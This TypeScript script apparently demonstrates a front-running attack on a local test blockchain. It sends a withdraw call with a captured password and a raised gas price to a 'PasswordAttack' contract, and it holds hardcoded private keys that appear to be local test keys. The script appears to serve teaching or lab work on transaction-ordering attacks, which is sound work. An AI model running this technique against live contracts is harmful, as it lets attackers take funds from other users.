import { ethers, ContractFactory } from "ethers";
import PasswordAttack from "../artifacts/src/contracts/PasswordAttack.sol/PasswordAttack.json";

const frontrun = async ({
  privateKey,
  gas,
}: {
  privateKey: string;
  gas: string | null;
}) => {
  const provider = new ethers.providers.JsonRpcProvider(
    "http://127.0.0.1:8545"
  );
  let signer = new ethers.Wallet(privateKey, provider);

  const contract = new ethers.Contract(
    "0x8464135c8F25Da09e49BC8782676a84730C318bC",
    PasswordAttack.abi,
    signer
  );

  await contract.withdraw("minhdangvadinhhuy", {
    gasPrice: gas,
    gasLimit: "1000000",
  });
};

const main = async () => {
  // 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 - 0xf3...
  // 0x47c99abed3324a2707c28affff1267e45918ec8c3f20b8aa892e8b065d2942dd - 0x1C...
  await frontrun({
    privateKey:
      "0x47c99abed3324a2707c28affff1267e45918ec8c3f20b8aa892e8b065d2942dd",
    gas: "10037883523",
  });
};

// 1 0xc32c5149ac85e292b75a4c8a18c2bfb5824171ef45dae1ba2c615df687751fff - 0xf3...
// 2 0x746658e79b1a71c79f8030597e68a6086a00f2543246e8c13bd4559cdd68d8af - 0x1C...

main();
